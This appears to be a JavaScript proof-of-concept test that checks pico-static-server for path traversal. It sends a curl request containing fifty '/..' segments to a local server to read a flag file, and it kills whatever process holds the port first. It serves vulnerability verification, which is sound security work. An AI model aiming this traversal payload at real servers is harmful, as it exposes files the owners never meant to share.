const path = require("path");
const pathToFlag = path.resolve("D:\\flag.html");
function genstr(n) {
  return "/..".repeat(50) + "\\flag.html";
}
// test("Path Traversal in pico-static-server", (done) => {
//   expect.assertions(1);
  const createServer = require("pico-static-server");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8982/tcp", () => {});
  } catch (e) {}
  const staticServer = createServer({
    defaultFile: "index.html",
    staticPath: ".",
    port: 8982,
  });
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8982${genstr()}"`;
  exec(attack_string, (error, stdout) => {
if (stdout == hostsFile) {
	console.log("this_is_vulnerable")
	process.exit(0);
} else {
	console.log("this_is_OK")
	process.exit(0);
}
//     done();
  });
// });
